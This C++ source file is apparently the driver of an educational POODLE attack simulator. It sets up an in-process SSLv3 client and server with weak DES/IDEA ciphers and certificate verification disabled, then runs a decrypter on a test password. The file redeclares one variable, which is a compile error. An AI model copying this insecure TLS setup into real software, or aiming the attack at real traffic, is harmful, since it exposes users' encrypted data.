// This is the program for generating the TCP Link executable.

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <resolv.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/ssl3.h>
#include "../client/client.h"
#include "../server/server.h"
#include "../controller/controller.h"
#include "../common/conf.h"
#include "../controller/poodle.h"
#include "../common/instruction.h"

static T_Controller* ctrl;

bool handle_instruction(T_Instr inst, const char* buffer, int len, T_Simulator* simu, CtrlLink* link){
    static char data[MAXBUF];
    switch (inst){
        case T_Instr::ENCRYPTED_MESSAGE_TO_PEER:{
            simu->send(buffer, len);
            break;
        }
        case T_Instr::SHUTDOWN_CONNECTION: {
            return false;
            break;
        }

        case T_Instr::PLAIN_MESSAGE_TO_PEER: {
            simu->plain_send(buffer, len);
            break;
        }

        case T_Instr::RECEIVED_PLAIN_TO_ME: {
            simu->recv(data);
            link->link_send( simu->get_encrypted_text(), simu->get_encrypted_len());
            break;
        }

        case T_Instr::RECEIVED_CHECK_VALID: {
            int len = simu->recv(data);
            bool isValid = (len>0);
            link->link_send((char*)&isValid, sizeof(bool));
            break;
        }
         default: break;
    }
    return true;
}

int main(int argc, char **argv)
{
    int sockfd, len;
    struct sockaddr_in dest;
    char buffer[MAXBUF + 1];
    SSL_CTX *cli_ctx, *sev_ctx;

    if (argc != 5) {
        printf("wrong format of arguments, please follow the guidelines on README\n");
        exit(0);
    }

    /* SSL 库初始化，参看 ssl-server.c 代码 */
    SSL_library_init();
    SSL_load_error_strings();
    cli_ctx = SSL_CTX_new(SSLv3_client_method());
    if (cli_ctx == NULL) {
        ERR_print_errors_fp(stdout);
        exit(1);
    }
    
    int valid = SSL_CTX_set_cipher_list(cli_ctx, "DES-CBC-SHA:DES-CBC3-SHA:IDEA-CBC-SHA");
    if (valid != 1) {
        ERR_print_errors_fp(stdout);
        exit(1);
    }
    SSL_CTX_set_verify(cli_ctx, SSL_VERIFY_NONE, NULL); 

    T_Client* cli = new T_Client(cli_ctx);

    sev_ctx = SSL_CTX_new(SSLv3_server_method());
    if (sev_ctx == NULL) {
        ERR_print_errors_fp(stdout);
        exit(1);
    }
    
    int valid = SSL_CTX_set_cipher_list(sev_ctx, "DES-CBC-SHA:DES-CBC3-SHA:IDEA-CBC-SHA");
    if (valid != 1) {
        ERR_print_errors_fp(stdout);
        exit(1);
    }
    SSL_CTX_set_verify(sev_ctx, SSL_VERIFY_NONE, NULL); 

    T_Server* sev = new T_Server(sev_ctx);

    char* sc_data = new char[MAXBUF];
    sev->set_fakelink(cli->out_bio, cli->in_bio, sc_data);
    cli->set_fakelink(sev->out_bio, sev->in_bio, sc_data);
    cli->handshake();

    CtrlLink* sev_lk = new FakeCtrlLink();
    CtrlLink* cli_lk = new FakeCtrlLink();

    ctrl = new T_Controller(sev_lk, cli_lk);
    
    PoodleDecrypter* poodle = new PoodleDecrypter(MAXBUF, 16, ctrl);
    if (poodle->run("password12", "password")) printf("A successful POODLE attack!\n");
        else printf("POODLE attack fails\n");
    ctrl->send_client_instruction(T_Instr::SHUTDOWN_CONNECTION, nullptr, 0);
    ctrl->send_server_instruction(T_Instr::SHUTDOWN_CONNECTION, nullptr, 0);

    SSL_CTX_free(sev_ctx);
    SSL_CTX_free(cli_ctx);
    return 0;
}